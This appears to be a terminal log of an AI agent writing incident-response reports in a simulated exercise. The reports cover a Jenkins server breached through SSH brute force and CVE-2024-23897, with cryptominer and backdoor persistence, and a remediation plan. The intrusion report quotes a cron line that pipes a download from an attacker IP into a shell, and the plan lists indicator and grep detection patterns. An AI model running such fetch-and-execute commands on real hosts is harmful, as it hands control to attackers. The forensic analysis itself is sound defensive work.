[?2004l[?2004hroot@f2456602c7f1:/app# cat <<'EOF' > /app/intrusion-report.md
[?2004l[?2004h> # Incident Intrusion Report ‚Äî Host `jenkins-prod-01`
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> On 2026-08-19, an external threat actor targeted host `jenkins-prod-01` (Ubuntu 22.04 LTS). The attack involved SSH password brute forcing, exploitation of CVE-2024-23897 on an insecure Jenkins controller instance, deployment of a Monero (XMR) cryptominer, establishing multiple persistence mechanisms (cron, Groovy init hook, SSH authorized key), and clearing/truncating Jenkins system logs. While security monitoring generated alerts for the cryptominer and cron job, two critical persistence mechanisms (Groovy init script and SSH backdoor) and log destruction actions remained silent.
[?2004l[?2004h> 
[?2004l[?2004h> ## Threat Entities & Indicators of Compromise (IoCs)
[?2004l[?2004h> - **Attacker Origin IP**: `198.51.100.98` (verified via SSH authentication logs `` `/disk/var/log/auth.log.1.gz:89` `` and Nginx web server access logs `` `/disk/var/log/nginx/access.log:370` ``). Note: SAS change ticket CHG-1700 initially misidentified this as `203.0.113.9` (`` `/sas/handoff/change-ticket.md` ``).
[?2004l[?2004h> - **C2 Domain / Infrastructure**: `update-jenkins.example.cn` (defanged `update-jenkins[.]example[.]cn` recovered from wiped log cache `` `/disk/var/lib/.cache/.wiped.bin:1` `` and threat intel advisory `` `/sas/cti/advisory.txt:23` ``).
[?2004l[?2004h> - **Mining Pool Endpoint**: `stratum+tcp://xmr.jenkins.evil:3333` (defanged `stratum+tcp[:]//xmr[.]jenkins[.]evil[:]3333` embedded in miner sample `` `/disk/opt/jenkins/.xmr/xmrig:4` `` and advisory `` `/sas/cti/advisory.txt:24` ``).
[?2004l[?2004h> - **Cryptocurrency Wallet**: `4A0000000000000000003d98ef6bc04b` (Monero wallet address found in miner binary `` `/disk/opt/jenkins/.xmr/xmrig:5` `` and advisory `` `/sas/cti/advisory.txt:25` ``).
[?2004l[?2004h> - **Compromised System Accounts**:
[?2004l[?2004h>   - `root`: Password brute forced from `198.51.100.98` (`` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h>   - `jenkins`: Service account hijacked via Jenkins CLI exploit and backdoor SSH key insertion (`` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ## Attack Chain & ATT&CK Technique Mapping
[?2004l[?2004h> 
[?2004l[?2004h> | Stage | ATT&CK Technique | On-Disk / SAS Artifact | In SAS Alerts? | Details & Citation |
[?2004l[?2004h> |---|---|---|---|---|
[?2004l[?2004h> | Reconnaissance / Brute Force | **T1110 (Brute Force)** / **T1078 (Valid Accounts)** | `/disk/var/log/auth.log.1.gz:89` | **NO (Silent)** | Attacker at `198.51.100.98` performed SSH password brute force against `root`, `admin`, `postgres`, `oracle`, `test`, succeeding as `root` on 2026-08-19 00:55:24 UTC (`` `/disk/var/log/auth.log.1.gz:89` `` and `` `/disk/var/log/auth.log:131` ``). |
[?2004l[?2004h> | Initial Access | **T1190 (Exploit Public-Facing Application)** | `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` | **YES** | Exploited Jenkins CLI arbitrary file read / RCE vulnerability (CVE-2024-23897). Deserialization gadget stored at `/var/lib/jenkins/jobs/.tmp/config.xml` (`` `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` ``, `` `/sas/alerts.json` `` ALERT-01). |
[?2004l[?2004h> | Execution | **T1059.004 (Unix Shell)** | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` | **NO (Silent)** | Groovy shell script execution spawning threads for reverse connection (`` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``). |
[?2004l[?2004h> | Impact | **T1496 (Resource Hijacking)** | `/disk/opt/jenkins/.xmr/xmrig:1` | **YES** | XMRig cryptominer binary executed (pid 1337) consuming high CPU cycles to mine Monero (`` `/disk/opt/jenkins/.xmr/xmrig:1` ``, `` `/sas/alerts.json` `` ALERT-02). |
[?2004l[?2004h> | Persistence (Cron) | **T1053.003 (Cron)** | `/disk/var/spool/cron/crontabs/jenkins:4` | **YES** | User crontab entry running `curl hxxp://198.51.100.98/x | sh` every minute to maintain miner execution and payload re-drops (`` `/disk/var/spool/cron/crontabs/jenkins:4` ``, `` `/sas/alerts.json` `` ALERT-03). |
[?2004l[?2004h> | Persistence (Groovy Init Hook) | **T1037.004 (RC Scripts / Init Scripts)** | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` | **NO (Silent)** | Malicious Groovy script `z-backdoor.groovy` planted in Jenkins init script directory establishing automated reverse shell to `198.51.100.98` upon Jenkins controller start (`` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``). |
[?2004l[?2004h> | Persistence (SSH Key Backdoor) | **T1098.004 (SSH Authorized Keys)** | `/disk/var/lib/jenkins/.ssh/authorized_keys:2` | **NO (Silent)** | Attacker public SSH key appended to `/var/lib/jenkins/.ssh/authorized_keys` enabling persistent backdoor SSH access to the `jenkins` user account (`` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``). |
[?2004l[?2004h> | Defense Evasion | **T1070.002 (Clear Linux System Logs)** | `/disk/var/lib/.cache/.wiped.bin:1` | **NO (Silent)** | Jenkins system logs truncated/wiped to destroy forensic evidence of CLI exploit execution (`` `/disk/var/lib/.cache/.wiped.bin:1` ``). |
[?2004l[?2004h> | Secondary Probes | **T1595 (Active Scanning)** | `/disk/var/log/nginx/access.log:370` | **NO (Silent)** | Attacker probed web server endpoints for webshell upload `/uploads/shell.php`, Log4Shell, and Struts vectors (`` `/disk/var/log/nginx/access.log:370` ``). |
[?2004l[?2004h> 
[?2004l[?2004h> ## Benign Operational Artifacts (Disambiguation)
[?2004l[?2004h> During the investigation, the following artifacts were reviewed and verified as legitimate operations:
[?2004l[?2004h> - `/var/lib/jenkins/init.groovy.d/logging.groovy`: Legitimate scheduled maintenance and remote backup job (`backup.sh --remote 10.10.71`) (`` `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:2` ``). Note: SAS change ticket referenced this as an approved change (`` `/sas/handoff/change-ticket.md` ``).
[?2004l[?2004h> - `/etc/crontab`: Standard system crontab running backup at 03:00 UTC (`` `/disk/etc/crontab:2` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ## Assessment of Overall Impact
[?2004l[?2004h> 1. **Compute Resources**: High CPU saturation due to active XMRig mining process (pid 1337) (`` `/disk/opt/jenkins/.xmr/xmrig:3` ``).
[?2004l[?2004h> 2. **System Integrity & Control**: Complete administrative control gained by attacker over the `jenkins` service user and system `root` account (`` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h> 3. **Redundant Backdoors**: Three distinct persistence vectors established (Cron, Groovy startup hook, SSH key) ensuring re-infection even if cron is removed (`` `/disk/var/spool/cron/crontabs/jenkins:4` ``, `` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``, `` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``).
[?2004l[?2004h> 4. **Auditability Impact**: Truncated logs hinder full timeline verification of executed Jenkins jobs (`` `/disk/var/lib/.cache/.wiped.bin:1` ``).
[?2004l[?2004h> EOF
[?2004l[?2004hroot@f2456602c7f1:/app# cat <<'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability Report ‚Äî Jenkins Controller (`jenkins-prod-01`)
[?2004l[?2004h> 
[?2004l[?2004h> ## Summary of Initial Access Vulnerability
[?2004l[?2004h> Initial access to the Jenkins controller host `jenkins-prod-01` was facilitated by exploiting **CVE-2024-23897**, a critical vulnerability in Jenkins core command-line interface (CLI) argument parsing (`` `/sas/vulns.json` `` and `` `/sas/cti/advisory.txt:15` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ## Vulnerability Technical Details: CVE-2024-23897
[?2004l[?2004h> - **CVE Identifier**: CVE-2024-23897 (`` `/sas/vulns.json` ``)
[?2004l[?2004h> - **Severity**: CVSS 9.8 (CRITICAL) v3.1 (`` `/sas/cti/advisory.txt:15` ``)
[?2004l[?2004h> - **Weakness Class**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory / Path Traversal) & CWE-27 (`` `/sas/cti/advisory.txt:15` ``)
[?2004l[?2004h> - **Affected Versions**: Jenkins weekly versions 2.441 and earlier, LTS versions 2.426.2 and earlier (`` `/sas/cti/advisory.txt:16` ``).
[?2004l[?2004h> - **Mechanism**: Jenkins CLI uses `args4j` library to parse command-line arguments. By default, `args4j` enables a feature that replaces an `@` character followed by a file path with the contents of the file. Unauthenticated attackers can send crafted CLI requests containing `@/path/to/file` to read arbitrary files from the Jenkins controller file system or expand deserialization gadgets (`` `/sas/cti/advisory.txt:16` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ## Evidence on Host
[?2004l[?2004h> - **RCE Deserialization Artifact**: A malicious job configuration artifact generated via the CLI deserialization exploit gadget was dropped at `/var/lib/jenkins/jobs/.tmp/config.xml` (`` `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` ``, `` `/sas/alerts.json` `` ALERT-01, capability `VUL-01`).
[?2004l[?2004h> - **Disabled Security Realm Context**: The vulnerability exploitation was further enabled because Jenkins security realm was explicitly disabled (`useSecurity=false`), permitting unauthenticated admin operations (`` `/disk/var/lib/jenkins/config.xml:3` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ## Reconciling False Vulnerability Claims
[?2004l[?2004h> - **Reconciliation of BlueKeep (CVE-2019-0708)**: The pre-filled change ticket `CHG-1700` erroneously listed "Patch CVE-2019-0708 (BlueKeep) on RDP" as action item #2 (`` `/sas/handoff/change-ticket.md` ``). Forensic inspection of `/disk` and `/sas` confirms:
[?2004l[?2004h>   1. The host runs Ubuntu 22.04 LTS (Linux), not Windows Server (`` `/disk/etc/os-release:1` ``).
[?2004l[?2004h>   2. BlueKeep (CVE-2019-0708) is a Windows Remote Desktop Services RCE vulnerability that does not affect Linux/Ubuntu systems (`` `/sas/cti/advisory.txt:15` ``).
[?2004l[?2004h>   3. The entry vector on `jenkins-prod-01` was strictly CVE-2024-23897 on Jenkins, combined with SSH password brute forcing (`` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h>   4. Change ticket `CHG-1700` has been reconciled in place to replace BlueKeep with patching CVE-2024-23897 on the Jenkins controller (`` `/sas/handoff/change-ticket.md` ``).
[?2004l[?2004h> 
[?2004l[?2004h> ## Secondary Probes & Other Vulnerabilities
[?2004l[?2004h> Nginx web access logs show web scanning probes from `198.51.100.98` attempting webshell upload `/uploads/shell.php`, Log4Shell (`jndi:ldap`), and Struts2 OGNL expression probes (`` `/disk/var/log/nginx/access.log:370` ``). These requests returned HTTP 404/500/200 status codes without successfully gaining alternative access, confirming CVE-2024-23897 and SSH credential brute force as the sole entry channels.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@f2456602c7f1:/app# cat <<'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline Configuration Assessment ‚Äî Host `jenkins-prod-01`
[?2004l[?2004h> 
[?2004l[?2004h> ## Overview
[?2004l[?2004h> A security baseline review of `jenkins-prod-01` identified multiple critical configuration weaknesses that contributed directly to successful exploitation, post-compromise persistence, and undetected lateral access.
[?2004l[?2004h> 
[?2004l[?2004h> ## Identified Configuration Weaknesses
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. Insecure Jenkins Authorization (`useSecurity=false`)
[?2004l[?2004h> - **Finding / Misconfiguration**: Jenkins security realm and access control matrix are disabled (`useSecurity=false`) in the primary Jenkins configuration file (`` `/disk/var/lib/jenkins/config.xml:3` ``, `` `/sas/baseline.json` `` CHK-06, capability `BAS-01`, `` `/sas/alerts.json` `` ALERT-04).
[?2004l[?2004h> - **Impact**: Anonymous users connected to the Jenkins web interface or CLI have full administrative privileges. This allowed unauthenticated CLI commands to execute deserialization gadgets and plant initialization hooks without requiring user credentials.
[?2004l[?2004h> - **Remediation**: Set `<useSecurity>true</useSecurity>` in `/var/lib/jenkins/config.xml`, enforce Jenkins internal user database or LDAP/OIDC SSO integration, and restrict CLI access.
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Permissive SSH Server Configuration & Password Authentication for Root
[?2004l[?2004h> - **Finding / Misconfiguration**: SSH daemon allowed password authentication for the `root` administrative account, permitting unrestricted remote password attempts (`` `/disk/var/log/auth.log:131` `` and `` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h> - **Impact**: Attacker at `198.51.100.98` successfully conducted password brute force against `root` and gained full system root shell access at 2026-08-19 00:55:24 UTC (`` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h> - **Remediation**: Disable SSH password authentication (`PasswordAuthentication no`) in `/etc/ssh/sshd_config`, disable root SSH login (`PermitRootLogin no`), enforce SSH public key authentication with hardware tokens/mfa, and enforce fail2ban/IP rate limiting.
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. Lack of Centralized Log Shipping & Integrity Protection
[?2004l[?2004h> - **Finding / Gaps**: Jenkins application logs and system logs were stored locally without centralized log shipping or read-only append-only audit stream protection (`` `/disk/var/lib/.cache/.wiped.bin:1` ``).
[?2004l[?2004h> - **Impact**: Attacker was able to wipe/truncate Jenkins execution logs at `/var/lib/.cache/.wiped.bin` to destroy forensic evidence of CLI execution without triggering a log tampering alert (`` `/disk/var/lib/.cache/.wiped.bin:1` ``).
[?2004l[?2004h> - **Remediation**: Deploy remote syslog / SIEM forwarding (e.g. `rsyslog`, `fluentbit`) with TLS, configure file integrity monitoring (FIM / `AIDE` / `wazuh`) on `/var/lib/jenkins` and `/var/log` directories.
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Excessive File System Permissions for Jenkins Service User
[?2004l[?2004h> - **Finding / Misconfiguration**: The `jenkins` service account possessed write permissions across `/var/lib/jenkins/init.groovy.d/`, `/var/lib/jenkins/.ssh/`, `/opt/jenkins/.xmr/`, and `/var/spool/cron/crontabs/jenkins` (`` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` `` and `` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``).
[?2004l[?2004h> - **Impact**: Once Jenkins service user context was compromised via RCE, the attacker dropped persistent Groovy scripts (`z-backdoor.groovy`), inserted SSH backdoor public keys (`authorized_keys`), and installed cron tasks (`` `/disk/var/spool/cron/crontabs/jenkins:4` ``).
[?2004l[?2004h> - **Remediation**: Enforce least privilege directory permissions. Restrict write access to `/var/lib/jenkins/init.groovy.d` so only `root` can write startup scripts; disable interactive shell login (`/usr/sbin/nologin`) for service users like `jenkins` (`` `/disk/etc/passwd:7` ``).
[?2004l[?2004h> EOF
[?2004l[?2004hroot@f2456602c7f1:/app# cat <<'EOF' > /app/remediation-plan.md
[?2004l[?2004h> # Prioritized Remediation Plan ‚Äî Host `jenkins-prod-01`
[?2004l[?2004h> 
[?2004l[?2004h> ## Overview & Rules
[?2004l[?2004h> This remediation plan addresses all threat vectors, persistence mechanisms, baseline weaknesses, and credential compromises identified on `jenkins-prod-01`. Per DFIR response policies, **quarantine/backup is preferred over deletion** for all forensic artifacts prior to system sanitization.
[?2004lenkins/init.groovy.d/z-backdoor.gr[?2004h> 
[?2004lo[?2004h> ---
[?2004l[?2004h> 
[?2004l3[?2004h> ## Reconciled Change Ticket (CHG-1700)
[?2004l[?2004h> *Note: This ticket corrects the pre-filled stale change ticket (`` `/sas/handoff/change-ticket.md` ``).* 
[?2004l[?2004h> 
[?2004l[?2004h> | # | Action | Target | Status | Note & Justification | Evidence Citation |
[?2004lhor[?2004h> |---|--------|--------|--------|----------------------|-------------------|
[?2004l[?2004h> | 1 | Block source IP inbound | `198.51.100.98` | OPEN | RECONCILED: Real attacker IP confirmed in SSH auth logs and Nginx access logs (was incorrectly listed as 203.0.113.9) | `` `/disk/var/log/auth.log.1.gz:89` `` |
[?2004l[?2004h> | 2 | Patch Jenkins (CVE-2024-23897) | Jenkins Controller | OPEN | RECONCILED: Vulnerability is CVE-2024-23897 (Jenkins CLI RCE), NOT BlueKeep (CVE-2019-0708) | `` `/sas/cti/advisory.txt:17` `` |
[?2004l[?2004h> | 3 | Remove cron miner persistence | `/var/spool/cron/crontabs/jenkins` | OPEN | RECONCILED: Downgraded from DONE to OPEN; malicious cron entry exists and is active | `` `/disk/var/spool/cron/crontabs/jenkins:4` `` |
[?2004l[?2004h> | 4 | Remove Groovy init hook backdoor | `/var/lib/jenkins/init.groovy.d/z-backdoor.groovy` | OPEN | ADDED: Unalerted silent persistence calling reverse shell to `198.51.100.98` | `` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` `` |
[?2004l[?2004h> | 5 | Remove SSH backdoor key | `/var/lib/jenkins/.ssh/authorized_keys` | OPEN | ADDED: Unalerted silent persistence with attacker SSH key added to Jenkins user account | `` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` `` |
[?2004l[?2004h> | 6 | Terminate cryptominer process & quarantine binary | `/opt/jenkins/.xmr/xmrig` | OPEN | ADDED: XMRig process (pid 1337) mining to stratum pool | `` `/disk/opt/jenkins/.xmr/xmrig:1` `` |
[?2004l[?2004h> | 7 | Quarantine RCE artifact | `/var/lib/jenkins/jobs/.tmp/config.xml` | OPEN | ADDED: Jenkins CLI RCE deserialization artifact | `` `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` `` |
[?2004l[?2004h> | 8 | Enable Jenkins Security Realm | `/var/lib/jenkins/config.xml` | OPEN | ADDED: Fix baseline security vulnerability (`useSecurity=false`) | `` `/disk/var/lib/jenkins/config.xml:3` `` |
[?2004l[?2004h> | 9 | Rotate SSH keys and credentials | Root and user credentials | OPEN | ADDED: Root password compromised via SSH brute force | `` `/disk/var/log/auth.log.1.gz:89` `` |
[?2004l[?2004h> | 10| Restore Jenkins log integrity and setup log shipping | `/var/lib/.cache/.wiped.bin` | OPEN | ADDED: Evidence of log wiping/truncation detected | `` `/disk/var/lib/.cache/.wiped.bin:1` `` |
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Phase 1: Immediate Containment & Network Isolation (Priority 1 ‚Äî Immediate)
[?2004l[?2004h> 1. **Network Layer Isolation & Perimeter Block**:
[?2004l[?2004h>    - Apply host firewall (`ufw`) and perimeter firewall rules to block `198.51.100.98` inbound and outbound (`` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h>    - Block outbound DNS/TCP to C2 domain `update-jenkins.example.cn` and mining pool `xmr.jenkins.evil:3333` (`` `/disk/var/lib/.cache/.wiped.bin:1` ``, `` `/disk/opt/jenkins/.xmr/xmrig:4` ``).
[?2004l[?2004h>    - *Verification*: `iptables -L -n -v | grep 198.51.100.98`.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Terminate Active Malicious Processes**:
[?2004l[?2004h>    - Terminate active cryptominer process (pid 1337) and any active reverse shells spawned by Groovy or cron (`` `/disk/opt/jenkins/.xmr/xmrig:3` ``, `` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``).
[?2004l[?2004h>    - *Verification*: `ps aux | grep -iE 'xmrig|z-backdoor|198.51.100.98'`.
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Phase 2: Eradication & Artifact Quarantine (Priority 2 ‚Äî Within 1 Hour)
[?2004l[?2004h> 1. **Quarantine Cryptominer Binary & RCE Artifacts**:
[?2004l[?2004h>    - Move `/opt/jenkins/.xmr/xmrig` and `/var/lib/jenkins/jobs/.tmp/config.xml` to a secure read-only forensic quarantine archive `/var/backups/quarantine_20260819.tar.gz` before removal (`` `/disk/opt/jenkins/.xmr/xmrig:1` ``, `` `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` ``).
[?2004l[?2004h>    - *Verification*: `ls -la /opt/jenkins/.xmr/xmrig` returns file not found; archive exists in `/var/backups/`.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Remove Backdoor Persistence Vectors**:
[?2004l[?2004h>    - Quarantine and remove malicious cron job from `/var/spool/cron/crontabs/jenkins` (`` `/disk/var/spool/cron/crontabs/jenkins:4` ``).
[?2004l[?2004h>    - Quarantine and remove malicious Groovy init hook `/var/lib/jenkins/init.groovy.d/z-backdoor.groovy` (`` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``). Note: Maintain legitimate script `/var/lib/jenkins/init.groovy.d/logging.groovy` (`` `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:2` ``).
[?2004l[?2004h>    - Remove attacker public SSH key from `/var/lib/jenkins/.ssh/authorized_keys` (`` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``).
[?2004l[?2004h>    - *Verification*: `crontab -u jenkins -l`, `ls /var/lib/jenkins/init.groovy.d/`, and `cat /var/lib/jenkins/.ssh/authorized_keys`.
[?2004l[?2004h> 
[?2004l[?2004h> 3. **Credential & SSH Key Rotation**:
[?2004l[?2004h>    - Change passwords for all administrative users (`root`, `devops`, `webadmin`, `svc-backup`, `postgres`) (`` `/disk/etc/passwd:1` ``, `` `/disk/var/log/auth.log.1.gz:89` ``).
[?2004l[?2004h>    - Invalidate and rotate all SSH keypairs across all accounts.
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Phase 3: Vulnerability Patching & System Hardening (Priority 3 ‚Äî Within 4 Hours)
[?2004l[?2004h> 1. **Patch Jenkins (CVE-2024-23897)**:
[?2004l[?2004h>    - Upgrade Jenkins package to version 2.442 or LTS 2.426.3 or higher (`` `/sas/cti/advisory.txt:17` ``).
[?2004l[?2004h>    - Verify CLI argument parser option `-Dhudson.cli.CLICommand.allowForcedFirstArgument=false` is enforced.
[?2004l[?2004h>    - *Verification*: `jenkins --version` or check Jenkins Web GUI admin dashboard.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Harden Jenkins Configuration**:
[?2004l[?2004h>    - Enable security realm in `/var/lib/jenkins/config.xml` by setting `<useSecurity>true</useSecurity>` and configuring RBAC (`` `/disk/var/lib/jenkins/config.xml:3` ``).
[?2004l[?2004h>    - Set permissions on `/var/lib/jenkins/init.groovy.d/` to `root:root 755` so service users cannot inject initialization hooks.
[?2004l[?2004h> 
[?2004l[?2004h> 3. **Harden Host SSH Configuration**:
[?2004l[?2004h>    - Update `/etc/ssh/sshd_config` to set `PermitRootLogin no` and `PasswordAuthentication no` (`` `/disk/var/log/auth.log:131` ``).
[?2004l[?2004h>    - Restart SSH daemon: `systemctl restart sshd`.
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Phase 4: Verification & Recovery (Priority 4 ‚Äî Post-Implementation)
[?2004l[?2004h> 1. **Integrity & File Verification**:
[?2004l[?2004h>    - Run AIDE / integrity check on `/var/lib/jenkins` and system binaries.
[?2004l[?2004h> 2. **Centralized Logging Setup**:
[?2004l[?2004h>    - Configure `rsyslog` / Fluentbit to stream `/var/log/auth.log`, `/var/log/nginx/access.log`, and Jenkins system logs to central SIEM to prevent future log truncation tampering (`` `/disk/var/lib/.cache/.wiped.bin:1` ``).
[?2004l[?2004h> 3. **Monitoring & Alerting Validation**:
[?2004l[?2004h>    - Confirm EDR alerts monitor Groovy script creation in `/var/lib/jenkins/init.groovy.d/` and SSH `authorized_keys` modifications.
